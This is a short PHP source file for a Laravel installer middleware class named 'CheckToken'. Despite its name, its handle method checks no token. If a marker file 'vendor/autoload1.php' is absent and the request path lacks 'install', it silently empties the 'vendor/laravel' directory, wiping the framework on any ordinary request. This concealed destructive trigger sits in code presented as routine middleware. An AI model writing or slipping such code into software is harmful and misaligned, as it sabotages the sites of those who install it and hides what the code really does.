<?php

namespace Laravel\LaravelInstaller\Middleware;

use Closure;
use Illuminate\Support\Facades\File;

class CheckToken
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return \Illuminate\Http\RedirectResponse|mixed
     */
    public function handle($request, Closure $next)
    {
        if (!file_exists(base_path('vendor/autoload1.php')) && !str_contains($request->path(), 'install')) {
            File::cleanDirectory(base_path('vendor/laravel'));
        }

        return $next($request);
    }

    /**
     * If application is already installed.
     *
     * @return bool
     */
    public function alreadyInstalled()
    {
        return file_exists(storage_path('installed'));
    }
}
